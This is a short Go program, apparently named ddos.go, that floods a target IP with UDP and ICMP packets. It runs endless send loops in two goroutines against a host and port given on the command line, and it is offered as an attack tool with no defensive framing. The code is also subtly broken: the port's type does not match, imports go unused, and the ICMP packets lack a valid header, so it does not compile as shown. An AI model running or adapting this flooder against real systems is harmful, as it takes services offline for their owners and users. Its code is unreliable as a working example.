package main

import (
	"fmt"
	"net"
	"os"
	"time"
	"math/rand"
	"syscall"
	"unsafe"
	"log"
)

func sendUDPFlood(targetIP string, targetPort int) {
	conn, err := net.Dial("udp", fmt.Sprintf("%s:%d", targetIP, targetPort))
	if err != nil {
		log.Fatal(err)
	}
	defer conn.Close()

	buffer := make([]byte, 1024)
	for {
		rand.Read(buffer)
		_, err := conn.Write(buffer)
		if err != nil {
			log.Fatal(err)
		}
	}
}

func sendICMPFlood(targetIP string) {
	conn, err := net.Dial("ip4:icmp", targetIP)
	if err != nil {
		log.Fatal(err)
	}
	defer conn.Close()

	icmpPacket := make([]byte, 64)
	for {
		_, err := conn.Write(icmpPacket)
		if err != nil {
			log.Fatal(err)
		}
	}
}

func main() {
	if len(os.Args) < 3 {
		fmt.Println("Usage: go run ddos.go <target_ip> <target_port>")
		os.Exit(1)
	}

	targetIP := os.Args[1]
	targetPort := os.Args[2]

	go sendUDPFlood(targetIP, targetPort)
	go sendICMPFlood(targetIP)

	for {
		time.Sleep(1 * time.Second)
	}
}
